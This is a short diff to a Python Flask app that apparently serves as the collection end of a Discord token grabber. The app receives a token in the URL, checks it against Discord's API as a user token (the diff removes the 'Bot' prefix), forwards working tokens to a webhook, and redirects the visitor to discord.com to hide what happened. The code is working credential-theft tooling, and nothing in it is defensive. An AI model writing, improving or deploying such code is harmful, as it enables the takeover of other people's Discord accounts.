@@ -6,22 +6,23 @@ import requests
 def check_discord_token(token):
     url = "https://discord.com/api/v10/users/@me"
     headers = {
-        "Authorization": f"Bot {token}"
+        "Authorization": f"{token}"
     }
     
     response = requests.get(url, headers=headers)
     
     if response.status_code == 200:
-        return True
+        return "True"
     else:
-        return False
+        return "False"
 
 e = os.getenv('DISCORD_URL')
 app = Flask(__name__)
 hook = Webhook(e)
 @app.route('/<string:token>')
 def index(token):
-  hook.send(token)
+  if check_discord_token(token) == "True":
+      hook.send(token)
   return redirect("https://discord.com")
 
 if __name__ == "__main__":
